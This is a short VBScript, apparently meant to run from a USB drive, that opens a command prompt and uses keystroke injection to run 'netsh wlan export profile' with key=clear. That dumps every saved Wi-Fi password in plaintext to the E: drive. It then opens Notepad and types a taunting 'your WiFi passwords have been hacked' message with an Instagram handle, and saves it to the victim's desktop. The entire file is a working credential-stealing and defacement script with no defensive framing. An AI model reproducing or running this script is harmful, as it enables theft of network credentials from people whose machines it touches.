Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe", 1, False
WScript.Sleep 500
objShell.SendKeys "netsh wlan export profile folder=E:\chakra\ key=clear{ENTER}"
WScript.Sleep 1000
objShell.SendKeys "color a"
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
WScript.Sleep 500
objShell.SendKeys "tree"
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
WScript.Sleep 500
objShell.SendKeys "exit{ENTER}"

WScript.Sleep 1000
objShell.Run "notepad.exe"
WScript.Sleep 1000
objShell.SendKeys "HI, THERE ,"
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
objShell.SendKeys "YOUR WIFI PASSWORDS HAVE BEEN HACKED."
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
objShell.SendKeys "INSTAGRAM:anon_X_invier  ,"
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
objShell.SendKeys "THANKS ,"
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
objShell.SendKeys "MR.INVIER"
WScript.Sleep 300
objShell.SendKeys "{ENTER}"
objShell.SendKeys "^s"
WScript.Sleep 1000
objShell.SendKeys "C:\Users\" & objShell.ExpandEnvironmentStrings("%USERNAME%") & "\Desktop\HACKED! BY MR.INVIER.txt"
WScript.Sleep 500
objShell.SendKeys "{ENTER}"

